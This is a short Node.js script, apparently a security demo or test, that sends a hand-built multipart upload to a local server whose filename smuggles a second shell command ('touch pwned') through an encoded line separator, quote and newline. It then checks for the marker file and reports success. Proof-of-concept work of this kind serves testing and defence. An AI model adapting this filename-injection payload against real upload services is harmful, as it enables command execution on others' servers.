#!/usr/bin/env node

const fs = require('fs');
const net = require('net');
const path = require('path');
const { URL } = require('url');

let template = `POST /upload HTTP/1.1
Accept: */*
Content-Type: multipart/form-data; boundary="893e5556-f402-4fec-8180-c59333354c6f"
Content-Length: HOLE

--893e5556-f402-4fec-8180-c59333354c6f
Content-Disposition: form-data; name="upload"; filename*=utf-8''HOLE

1337
--893e5556-f402-4fec-8180-c59333354c6f--`;

template = `${template}\n`.replace(/\n/g, '\r\n');

const [ beforeLength, middle, afterFilename ] = template.split('HOLE');

const rawFilename = 'x.y\u2028" \ntouch pwned\necho "';

const filename = pctEncodeAll(rawFilename);

let contentLength = middle.length - (middle.indexOf('\r\n\r\n') + 4) + afterFilename.length;
contentLength += filename.length;

const message = beforeLength + contentLength + middle + filename + afterFilename;

const url = new URL('http://localhost:8080/');
let response = '';
const client = net.Socket();
client.on('data', (chunk) => {
  response += chunk;
  client.end();
});
client.on('close', () => {
  let fsRoot = path.join(__dirname, '..', '..');
  // check that effect happened or didn't
  if (fs.existsSync(path.join(fsRoot, 'pwned'))) {
    console.log(`Attack succeeded.  File pwned created at ${fsRoot}`);
  }
});
client.connect(url.port, url.hostname, () => {
  console.log(`Sending\n"""\n${message}\n"""`);
  client.write(message);
});

function pctEncode (ch) {
  let pch = encodeURIComponent(ch);
  if (pch[0] === ch) {
    const hex = pch.charCodeAt(0).toString(16);
    if (hex.length > 2) {
      throw new Error(ch);
    }
    pch = `%${(hex.length === 1 ? '0' : '') + hex}`;
  }
  return pch;
}
function pctEncodeAll (s) {
  return s.split('').map(pctEncode).join('');
}
